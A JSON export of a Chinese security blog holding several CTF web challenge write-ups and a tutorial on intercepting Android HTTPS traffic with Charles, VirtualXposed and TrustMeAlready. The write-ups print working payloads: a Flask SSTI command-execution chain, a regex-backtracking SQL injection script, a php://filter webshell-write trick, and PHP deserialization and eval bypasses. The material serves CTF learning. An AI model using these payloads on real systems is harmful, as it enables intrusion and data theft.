{"pages":[{"title":"关于我","text":"Yunen 网络安全爱好者，CQU大三狗。企鹅：Mjg2NTg1OTE3NQ== (Base64)本站信息：站点：Yunen’s Blog链接：https://www.0x002.com/头像：https://q1.qlogo.cn/g?b=qq&amp;nk=2865859175&amp;s=160个签：Just A Websafe Lover! 友链要求： 非免费域名(包括但不限于freenom等) 运营时间至少大于两个月，且博文至少有10篇 友链申请请在下方留言哦~","link":"/about/index.html"}],"posts":[{"title":"2020重庆市教育系统网络安全攻防竞赛决赛 - Web Writeup","text":"前言刚参加完比赛，趁还热乎这，就简(shui)单(pian)记(bo)录(ke)一下解题过程吧。逃( 正文web共有4题，能力有限，只做出了3题。 flask题目告诉了web框架是flask，故开题直接老规矩，寻找SSTI。而考点重灾区，404页面肯定是第一时间要尝试的。 寻找404页面： 发现页面会将地址信息填充到页面内，直接{{ 7*7 }}尝试，如果返回49则代表此处极有可能存在SSTI漏洞。 BINGO。接下来尝试从基类寻找危险函数了。 在此过程中发现题目存在WAF，对于存在下划线_与点号.的URL会被WAF拦截。 对于下划线我们可以通过请求代换给他去掉，如 123POST /{{ &quot;&quot;[request[&quot;values&quot;][&quot;class&quot;]] }}class=__class__ 上述payload在flask环境下相当于： 1GET /{{ &quot;&quot;.__class__ }} 寻找可用的类（通过Burp的Intruder爆破）： 1234567POST /%7B%7B''[request[&quot;values&quot;][&quot;class&quot;]][request[&quot;values&quot;][&quot;mro&quot;]][request[&quot;values&quot;][&quot;subclass&quot;]]()[§§][request[&quot;values&quot;][&quot;init&quot;]][request[&quot;values&quot;][&quot;globals&quot;]][request[&quot;values&quot;][&quot;builtins&quot;]]%7D%7D HTTP/1.1Host: x.x.x.x:10009User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Content-Type: application/x-www-form-urlencodedContent-Length: 108class=__class__&amp;mro=__base__&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__ 450为无效数据，在有效数据内随意找一个含有eval的类来执行代码： 读取利用eval函数列目录然后读取FLAG即可。 EXP： 1234567POST /%7B%7B''[request[&quot;values&quot;][&quot;class&quot;]][request[&quot;values&quot;][&quot;mro&quot;]][request[&quot;values&quot;][&quot;subclass&quot;]]()[41][request[&quot;values&quot;][&quot;init&quot;]][request[&quot;values&quot;][&quot;globals&quot;]][request[&quot;values&quot;][&quot;builtins&quot;]]['eval'](request[&quot;values&quot;][&quot;a&quot;]%2b&quot;import&quot;%2brequest[&quot;values&quot;][&quot;a&quot;]%2b'(&quot;os&quot;)'+request[&quot;values&quot;][&quot;b&quot;]+&quot;popen('cat /flag')&quot;+request[&quot;values&quot;][&quot;b&quot;]+'read()')%7D%7D HTTP/1.1Host: x.x.x.x:10009User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36Content-Type: application/x-www-form-urlencodedContent-Length: 117class=__class__&amp;mro=__base__&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;a=__&amp;b=. sql这题侥幸拿了个一血，考点是PHP正则回溯漏洞。 打开题目链接，随意点了两下，发现一个可疑的URL，疑似是文件包含的功能，尝试LFI读取一下。 另一边direarch的结果也出来了： 结合本次题目标题，猜测考点为sql注入，我们先读取一下sql.php文件，看下后端的SQL代码是如何拼接的。 1file.php?file=php://filter/read=convert.base64-encode/resource=sql 得到sql.php源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phperror_reporting(0);include(&quot;config.php&quot;);$id=isset($_POST['id']) ? $_POST['id'] : 1;if(preg_match('/UNION.+?SELECT|\\/\\*.*\\*\\/|sleep|and|if|&amp;&amp;|\\|\\||\\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is', $id)) { die('SQL Injection');}mysqli_query($conn,&quot;set names utf8&quot;);$sql=&quot;select * from `ctf` where id ='&quot;.$id.&quot;'&quot;;$result=mysqli_query($conn,$sql);$row=mysqli_fetch_row($result);if($id==1){ echo &quot;&lt;img src='./img/1.png'&gt;&lt;br&gt;&quot;;}else if($id==2){ echo&quot;&lt;img src='./img/2.jpg'&gt;&lt;br&gt;&quot;;}else if($id==3){ echo&quot;&lt;img src='./img/3.jpg'&gt;&lt;br&gt;&quot;;}else{ echo &quot;what do you do?&quot;;}echo &quot; &lt;p class=\\&quot;lead\\&quot;&gt; {$row[1]} &lt;/p&gt; &lt;p class=\\&quot;lead\\&quot;&gt; {$row[2]} &lt;/p&gt; &quot;?&gt; 老实说，看到第一个正则判断就知道是考PHP正则回溯了，之前有碰到过相关的题。 故我们编写脚本，使用脚本帮助我们添加100w个垃圾数据，EXP如下： 12345678910111213# author: yunen# blog: www.0x002.comimport requestssession = requests.session()payload = 'a' * 1000000burp0_url = &quot;http://x.x.x.x:10004/sql.php&quot;burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}burp0_data = {&quot;id&quot;: &quot;5' union/*&quot; + payload + '*/select 1,2,group_concat(flag) from flag#'}r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)print(r.text) exit这题挺有意思的，前前后后花费了好几个小时，最终才在比赛结束前半个小时弄出来。 打开题目得到源码： 1234567891011121314151617&lt;?php show_source('index.php'); function getKey($path){ $name = $path.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).'.php'; return $name; } echo $_SERVER[&quot;REMOTE_ADDR&quot;]; $expire = $_POST['expire']; $path = $_POST['path']; $filename = getKey($path); $value = $filename; $data = serialize($value); $data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data);?&gt; 可以看到关键点在与： 12$data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;$result = file_put_contents($filename, $data); 而第一句是不是有些眼熟？没错，这是EIS 2019 EZPOP其中的一个考点之一，并且后续也有几个题目模仿了此题，可以说是老熟悉的题了。 但是此题的关键再于$filename与$data序列化前的内容相同。 对于sprintf('%012d', $expire)来说，会返回12位的数字字符串，接着与exit()拼接上形成一段php代码。 由于exit()的存在，使得正常情况下程序不会执行到exit()之后的内容。所以如何跳出死亡exit成为了关键所在。 这里我们采用LFI来控制file_put_contents写入的内容，payload如下： 1expire=0&amp;path=php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@%20p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple 其中convert.iconv.UCS-4LE.UCS-4BE过滤器会将伪协议加载的字节流进行可以进行usc-4编码转化，从而使得原本的死亡exit代码块面目全非，php解析器自然是无法识别的。而我们自行构造的字节流也能拼接上去，经过编码转换后成为新的php代码。这段说得有点笼统，具体的详情请移步至这位大佬的文章：file_put_content和死亡·杂糅代码之缘。 后记这次比赛题目质量还行，虽说对于大佬来说可能就是洒洒水的级别，但总的来说还算有所收获的，学到了一些东西，也感受到了自己不足的一些方向。对于web2的sql那题来说，能拿一血就是对我平常习惯写文章来记录所学内容的一种肯定，如果当初自己没写那篇总结，估计也那不到一血。XD 最后放一张弟弟队的成绩图，前几名的大佬都tql，orz。","link":"/2020/2020%E9%87%8D%E5%BA%86%E5%B8%82%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B%20-%20Web%20Writeup/"},{"title":"2019全国大学生信息安全大赛两道web","text":"简单小结菜鸟第一次打国赛，这次题目质量很高，学到了许多姿势。 WebJustsoso打开题目，源代码出存在提示：使用LFI读取index.php与hint.php 123http://d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com/?file=php://filter/read=convert.base64-encode/resource=index.phphttp://d4dc224926cd47bca560b0ec2f84bad155efe5b747574b89.changame.ichunqiu.com/?file=php://filter/read=convert.base64-encode/resource=hint.php 得如下源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[&quot;file&quot;]; $payload = $_GET[&quot;payload&quot;];if(!isset($file)){ echo 'Missing parameter'.'&lt;br&gt;';}if(preg_match(&quot;/flag/&quot;,$file)){ die('hack attacked!!!');}@include($file);if(isset($payload)){ $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value){ if (preg_match(&quot;/flag/&quot;,$value)) { die('stop hacking!'); exit(); } } $payload = unserialize($payload);}else{ echo &quot;Missing parameters&quot;; } ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;&lt;?php class Handle{ private $handle; public function __wakeup(){ foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } echo &quot;Waking up\\n&quot;; } public function __construct($handle) { $this-&gt;handle = $handle; } public function __destruct(){ $this-&gt;handle-&gt;getFlag(); }}class Flag{ public $file; public $token; public $token_flag; function __construct($file){ $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); } public function getFlag(){ $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) { if(isset($this-&gt;file)){ echo @highlight_file($this-&gt;file,true); } } }}?&gt; 很容易可以知道此题考的是php反序列化，通过file引入hint.php到index.php，操作payload反序列化执行类中的getflag()函数此题有两个难点：正则Flag判断绕过与随机数md5判断的绕过前者可通过使用 ///绕过parse_url()函数，此时该函数获取到的内容为空，而后者可以使用指针来将token_flag指向token，来使两者恒等。 添加以下代码在本地生成序列化字符串：1234$a = new Flag(‘flag.php’);$a-&gt;token_flag = &amp;$a-&gt;token;$b = new Handle($a);echo urlencode(serialize($b));输出的结果为：1O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22bc573864331a9e42e4511de6f678aa83%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D 注意里边有不可见字符%00，且需要将Handle的对象数量改成2+，这样才可以进入__destruct函数。故最终payload为：1///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;bc573864331a9e42e4511de6f678aa83&quot;;s:10:&quot;token_flag&quot;;R:4;}} love_math打开题目，发现在js地址出使用ajax向calc.php发送数据使用浏览器访问之，得源码12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c'])){ show_source(__FILE__); }else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;太长了不会算&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;请不要输入奇奇怪怪的字符&quot;); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;请不要输入奇奇怪怪的函数&quot;); } } //帮你算出答案 eval('echo '.$content.';'); } 可以看到过滤了一些常用字符和基于白名单的过滤，限制得比较死，故此处我们只能使用白名单内的函数来进行命令执行，且不能有黑名单内的字符。 我们注意到，白名单里边的base_convert、dechex、decbin等用于进制转换的函数，我们可以使用其来绕过基于白名单的检测。比如：phpinfo可以将phpinfo先转换成hex，在转换成十进制，这样就可以做到无字母执行函数。 由于长度问题，我们无法直接在参数c里传过多的白名单函数+字符，所以这里我们使用其他GET参数传入，不直接使用参数c，即可绕过，但要注意的是此处的参数名，不能为字母，只能为数字，不然会被第二个关键词白名单所拦截。 再由于Ascii转成Hex后转回来需要hex2bin函数，而白名单里并没有这个函数，所以我们需要使用进制转换进行绕过，又因为hex2bin里部分字母只有在32进制后才会出现，所以此处我们选择36进制。将hex2bin由36进制成无字母的10进制得到：37907361743我们使用base_convert（37907361743，10,36即可转换成hex2bin，而_GET的hex为5f474554，里边包含了字母f，需要在进行一次转换：f正好为16进制里的最后一个字母，可直接使用dechex(1598506324)即可绕过。故$sin=base_convert(37907361743,10,36)(dechex(1598506324))即为$sin=_GET接着我们继续构造:我们知道：$$sin = $_GET那么$$sin[a]()即可自定义函数名，但主要此处参数不可为字母，且[]被过滤，故改成$$sin{0}($$sin{1})`所以payload构造如下：1?C=$sin=base_convert(37907361743,10,36)(dechex(1598506324));$$sin{0}($$sin{1});&amp;0=show_source&amp;1=flag.php","link":"/2019/2019%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E5%AE%89%E8%B5%9B%E4%B8%A4%E9%A2%98WEB%E9%A2%98%E8%A7%A3/"},{"title":"Android 7.0以上使用VirtualXposed和Charles进行抓包","text":"前言最近在对一个app进行测试的时候，尝试抓取数据包，发现以前的使用方法失效了，原因是随着安卓版本的提高，对证书的限制越发严格，而我身边的老机子放在学，不在身边，没得办法，只好研究一下怎么绕过这种限制。 经过一方查找，终于发现了一个相对比较简单的办法，这里就开一篇文章，记录一下。 过程首先下载所需要的工具： Charles——https://www.charlesproxy.com/download/ Charles-Crack(有能力的同学请支持正版)——https://github.com/8enet/Charles-Crack VirtualXposed——https://github.com/android-hacker/VirtualXposed/releases TrustMeAlready——https://github.com/ViRb3/TrustMeAlready/releases PC端PC端下载并安装好之后，运行Charles。 依次点击菜单栏的：Proxy→Proxy Settings，并按如下进行勾选。 接着点击菜单栏：Proxy→SSL Proxying Settings 按照下图进行配置： 若事先确定要抓取的Host和Port信息，可自行进行更改。 接着点击Proxy→Windows Proxy (注：不同版本名称不同)，将不再抓取本地流量。 然后点击Help→SSL Proxying→Install Charles Root Certificate on a Mobile Device or Remote Browser，将证书挂载到chls.pro/ssl这个地址上。 手机端用浏览器打开上述地址，将证书下载到本地。这步也可以选择点击菜单栏：Help→SSL Proxying→Save Charles Root Certificate…，来将证书下载到PC，通过数据线、QQ等方法传到手机。 手机端首先需要把手机与电脑连接到同一个网络内。 打开WLAN，选择对应的WIFI，进行代理配置。如下图所示： 主机名为PC端的内网IP，端口为配置Charles时Proxy Settings配置中的Http Proxy里的Port内容。 PC端内容不清楚的同学可以打开终端运行如下命令： Windows: ipconfig Linux: ifconfig Mac: ifconfig 成功代理上之后，手机端的流量都会经过PC端的Charles。如果是第一次配置，则Charles会弹出一个窗口，提示有新的连接，点击Allow按钮。 其次需要将电脑端Charles的证书给安装上。 若在PC端选择的是Install Charles Root Certificate on a Mobile Device or Remote Browse，则先需要通过手机浏览器访问chls.pro/ssl这个网址获得证书文件。 这里我使用的手机为小米8 Lite，不同的手机品牌/型号安装证书的方法可能有所不同，具体可通过搜索引擎来获得安装的方法。 依次点击：设置→更多设置→系统安全→加密与凭据→从SD卡安装，接着在文件浏览器中选择你下载好的证书。 然后给证书凭据起个名字，可随意填写，凭据用途选择VPN和应用。 安装完毕后依次点击：信任的凭证→用户，即可查看到刚刚添加进来的Charles证书——XK72 Ltd。 以往我们只需要执行到这里，便可以成功抓取到数据包。不过由于Android的版本更新，对用户自身添加的证书进行了限制，导致我们直接地无法抓取的HTTPS数据包，在Charles里会发现HTTPS的流量都显示Unknown。 这里我选择的办法是用VirtualXposed工具进行绕过，如果你不想使用这个方法，也可以考虑通过将手机进行Root处理，并将Charles的证书添加到系统级的证书中，不过这并不在本文讨论的范畴。 手机下载好VirtualXposed和TrustMeAlready两个apk文件，安装VirtualXposed.apk之后运行。 在VirtualXposed中，先进入设置页面，点击添加应用，选择你想抓取流量的应用，以及TrustMeAlready.apk文件进行安装。注意：由于TrustMeAlready.apk未安装，需要点击+号按钮，在对应的目录选择apk文件即可。 然后再回到设置页面，点击模块管理，可以看到我们刚刚添加的TrustMeAlready便在其中，点击右边的框框进行勾选，接着回到设置页面，在最下方点击重启、确定。 到这里我们便已经完成了全部的操作，之后你可以在VirtualXposed框架内打开任意的app都可以成功取到HTTPS流量。 关于Charles的使用方法，本文不再赘述，网络上已有许多教程，稍微花点时间搜索即可。 分析Android7.0+为何无法直接截取HTTPS流量在Android开发者平台文档，我们可以查到这么一段话： 默认情况下，来自所有应用的安全连接（使用 TLS 和 HTTPS 之类的协议）均信任预装的系统 CA，而面向 Android 6.0（API 级别 23）及更低版本的应用默认情况下还会信任用户添加的 CA 存储区。应用可以使用 base-config（应用范围的自定义）或 domain-config（网域范围的自定义）自定义自己的连接。 自定义可信 CA|Android Developer 以上说明了安卓6.0以上的版本，在默认情况下应用是不会相信用户添加的CA证书，导致我们使用老方法无法完整地获取到应用发出的HTTPS数据。 VirtualXposed+TrustMeAlready实现原理简单的说，VXP相当于手机上的虚拟机，在手机原有的系统上创建一块虚拟空间，类似沙盒般的效果，而通过TrustMeAlready插件，便可HOOK到 APK 中所有用于校验 SSL 证书的 API (详情可以点击参考里的《JustTrustMe原理分析》)，从而绕过证书校验，故此达到https抓包的效果。 一、什么是Virtual Xposed？Xposed众所周知Xposed是来自国外XDA论坛的rovo89开发的一款开源的安卓系统框架。 它是一款特殊的安卓App，其主要功能是提供一个新的应用平台，玩家们安装Xposed框架后，就能够通过Xposed框架搭建起的平台安装更多系统级的应用，实现诸多神奇的功能。 Xposed框架的原理是修改系统文件，替换了/system/bin/app_process可执行文件，在启动Zygote时加载额外的jar文件（/data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar），并执行一些初始化操作(执行XposedBridge的main方法)。然后我们就可以在这个Zygote上下文中进行某些hook操作。 Xposed真正强大的是它可以hook调用的方法.当你反编译修改apk时,你可以在里面插入xposed的命令,于是你就可以在方法调用前后注入自己的代码. Github开源地址: https://github.com/rovo89/Xposed 由于Xposed最大的弊端在于设备需要root，并且编写插件模块后需要重启手机（当然也有办法可以不用重启），所以有了VirtualApp。 VirtualAppVirtualApp是一个App虚拟化引擎（简称VA）。 VirtualApp在你的App内创建一个虚拟空间（构造了一个虚拟的systemserver），你可以在虚拟空间内任意的安装、启动和卸载APK，这一切都与外部隔离，如同一个沙盒。 运行在VA中的APK无需在外部安装，即VA支持免安装运行APK。 熟悉android系统开机流程的应该知道各services是由system server启动一系列的系统核心服务（AMS,WMS,PMS等等）ViratualApp就是构建了一个虚拟system_process进程，这里面也有一系列的核心服务。 VirtualApp主要技术用到了反射和动态代理来实现的 Github开源地址：https://github.com/asLody/VirtualApp VirtualXposedVirtualXposed就是基于VirtualApp和epic 在非ROOT环境下运行Xposed模块的实现（支持5.0~8.1)。 Github开源地址：https://github.com/android-hacker/VirtualXposed 来源：http://jackzhang.info/2018/04/09/VirtualXposed/ HTTPS抓包为何需要安装抓包工具的CA证书为了弄清楚这个问题，我们首先得清楚SSL/TLS加密的原理。 通常来说，SSL与TLS都是非对称加密的，有一个公钥与私钥。公钥是公开的，私钥是私密的，存在于服务端。服务器返回的内容会被私钥加密，客户端需要使用公钥进行解密。同样的，用户端的数据便有公钥加密，私钥来解密。 而我们都知道，使用了SSL之后我们便可以保护我们的站点免受中间人攻击。那又何为中间人攻击呢？ 举个例子，用户A要使用电脑访问网站http://example.com，而这台电脑已被攻击者B攻陷，那么攻击者B可通过修改A电脑上的hosts文件，将example.com的解析指向B自己的服务器，这样A用户就在”不知情“的情况下中了招。而如果该网站使用了SSL/TLS加密时，用户A在访问https://example.com的时候，需要向服务器请求公钥的内容，又因为公钥是放在CA证书里的，且CA证书通常是由相关的权威CA机构（权威性由微软等操作系统巨头决定）才能发布，类似我们的民政局才能发布身份证。这使得攻击者无法伪造CA证书，因为客户端在收到CA证书之后会根据不同的权威CA机构进行相应的验证，而若颁发该证书的机构不够权威（这使得权威机构也不会随意颁发CA证书，以免自身的权威性被取消），是不会被系统所信任的。这一连串的操作，使得使用了SSL/TLS的网站可以不受中间人攻击的影响。 OK回归正题，那这HTTPS抓包与中间人攻击有何关系呢？其实这两者的原理都是一样的，只不过攻击者的角色变成了抓包工具。 So，这次的问题就变成了中间人攻击如何在HTTPS通信中生效？ 我们注意到，中间人攻击的最大难点就在于CA证书的权威性，而我们在没有域名解析权的情况下是不能去向权威CA机构申请证书的。那么既然如此，为何我们不考虑自己“开”一家权威机构呢，这样我们生成的证书不就会被信任了嘛。 这时候，就得需要安装我们抓包工具的CA证书了，这个证书与域名所有者向权威机构申请的证书不同，他是根证书。 因为域名的CA证书的验证过程也是非对称加密验证，也就说，CA证书的验证是由根证书里的公钥来解密验证的。通常操作系统里已经默认信任了一批权威机构的根证书。 所以，当我们把我们自己的根证书添加到操作系统中时，相当于我们自己“开”了一家权威CA机构，这样便可以解决了之前的难题。 借一张网图： 源自：图解 HTTPS：Charles 捕获 HTTPS 的原理 结语别看上边方法好像挺简单的，实际操作起来却挺繁琐，网络上的方法大多抄来吵去且时效性很差，导致在操作过程中也走了许多弯路，许多东西还是自己实验之后才知道。看似简单的东西，其实写起来可学习的东西还是很多的，以前自己在学习的时候没有注意的点，现在看起来也是可以细细研究的。不骄不躁，Stay Hungry, Stay Foolish. 参考 通过 HTTPS 和 SSL 确保安全|Android开发者文档 VirtualXposed插件开发-Xposed hook 之入门案例 JustTrustMe原理分析 图解 HTTPS：Charles 捕获 HTTPS 的原理","link":"/2020/Android%207.0%E4%BB%A5%E4%B8%8A%E4%BD%BF%E7%94%A8VirtualXposed%E5%92%8CCharles%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85/"},{"title":"CTF实验吧让我进去writeup","text":"初探题目两个表单，我们用burp抓包试试这时候我们发现Cookie值里有个很奇怪的值是source，这个单词有起源的意思，我们就可以猜测这个是判断权限的依据，让我们来修改其值为1，发送得到如下显示： 代码审计发现爆出了源代码，让我们来审计一下1234567891011121314151617181920212223242526272829303132&lt;?php$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don't match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); }}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here }}我们如果需要获得flag，需要满足一下条件：1.Cookie中getmein的值不能为空2.username必须为admin和password不能为admin3.Cookie中的getmein必须等于md5($secret.urldecode($username.$password))满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));发现下面有行代码是这样写的，将输出的md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;))作为cookie输出，结合前面的数据包我们可以知道输出的值为571580b26c65f306376d4f64e53cb5c7 可是这串md5是由$secret+’adminadmin’转md5而得到的，如果我们在password输入admin将不满足前面所需的三个条件 死局转生我们知道常见的md5是16位的，而这里的md5正是16位，我们的$secret是十五位的,加上’adminadmin’就变成25位了，很明显这里的md5肯定会出现重复，所以我们可以哈希长度拓展攻击绕过这个死局这里附两个讲述具体原理的链接:http://www.freebuf.com/articles/web/69264.html https://www.cnblogs.com/p00mj/p/6288337.html 在Kali下用hashpump操作最好我们构造数据包，把生成的数据发送即可获得flag","link":"/2018/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7%E8%AE%A9%E6%88%91%E8%BF%9B%E5%8E%BBwriteup/"},{"title":"CISCN 2020 Web WriteUp","text":"前言今天刚打了CISCN2020，简单的WEB题都没有AK… 太菜了 题解easyphp通过题目描述猜测本题的考点应该是要让子线程非正常退出，执行phpinfo()得到flag。 根据代码： 123456789101112131415161718192021222324252627282930313233&lt;?php //题目环境：php:7.4.8-apache $pid = pcntl_fork(); if ($pid == -1) { die('could not fork'); }else if ($pid){ $r=pcntl_wait($status); if(!pcntl_wifexited($status)){ phpinfo(); } }else{ highlight_file(__FILE__); if(isset($_GET['a'])&amp;&amp;is_string($_GET['a'])&amp;&amp;!preg_match(&quot;/[:\\\\\\\\]|exec|pcntl/i&quot;,$_GET['a'])){ call_user_func_array($_GET['a'],[$_GET['b'],false,true]); } posix_kill(posix_getpid(), SIGUSR1); } 查询手册得到： pcntl_wait函数刮起当前进程的执行直到一个子进程退出或接收到一个信号要求中断当前进程或调用一个信号处理函数。 如果一个子进程在调用此函数时已经退出（俗称僵尸进程），此函数立刻返回。子进程使用的所有系统资源将 被释放。 故我们尝试使用回调函数调用pcntl_wait函数，让子线程异常退出。 Ture和False在充当int类型参数时会转成1和0。 EXP： 1/?a=call_user_func&amp;b=pcntl_wait littlegame通过扫描工具得到源码www.zip，下载下来读取后发现此题很多都是假功能，读取flag处与其他功能在正常逻辑下是毫无办法获取到的。 发现setFn(req.session.knight, key, value);这串代码可以给session赋值。 此函数是由require('set-value');该库导入。 通过在package.json得知此库的版本为3.0.0。通过搜索引擎查阅得知，这里存在原型链污染漏洞。https://snyk.io/vuln/SNYK-JS-SETVALUE-450213 污染原型： 获取FLAG： rceme打开题目得到源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?php error_reporting(0); highlight_file(__FILE__); parserIfLabel($_GET['a']); function danger_key($s) { $s=htmlspecialchars($s); $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert'); $s = str_ireplace($key,&quot;*&quot;,$s); $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert'); foreach ($danger as $val){ if(strpos($s,$val) !==false){ die('很抱歉，执行出错，发现危险字符【'.$val.'】'); } } if(preg_match(&quot;/^[a-z]$/i&quot;)){ die('很抱歉，执行出错，发现危险字符'); } return $s; } function parserIfLabel( $content ) { $pattern = '/\\{if:([\\s\\S]+?)}([\\s\\S]*?){end\\s+if}/'; if ( preg_match_all( $pattern, $content, $matches ) ) { $count = count( $matches[ 0 ] ); for ( $i = 0; $i &lt; $count; $i++ ) { $flag = ''; $out_html = ''; $ifstr = $matches[ 1 ][ $i ]; $ifstr=danger_key($ifstr,1); if(strpos($ifstr,'=') !== false){ $arr= splits($ifstr,'='); if($arr[0]=='' || $arr[1]==''){ die('很抱歉，模板中有错误的判断,请修正【'.$ifstr.'】'); } $ifstr = str_replace( '=', '==', $ifstr ); } $ifstr = str_replace( '&lt;&gt;', '!=', $ifstr ); $ifstr = str_replace( 'or', '||', $ifstr ); $ifstr = str_replace( 'and', '&amp;&amp;', $ifstr ); $ifstr = str_replace( 'mod', '%', $ifstr ); $ifstr = str_replace( 'not', '!', $ifstr ); if ( preg_match( '/\\{|}/', $ifstr)) { die('很抱歉，模板中有错误的判断,请修正'.$ifstr); }else{ @eval( 'if(' . $ifstr . '){$flag=&quot;if&quot;;}else{$flag=&quot;else&quot;;}' ); } if ( preg_match( '/([\\s\\S]*)?\\{else\\}([\\s\\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { switch ( $flag ) { case 'if': if ( isset( 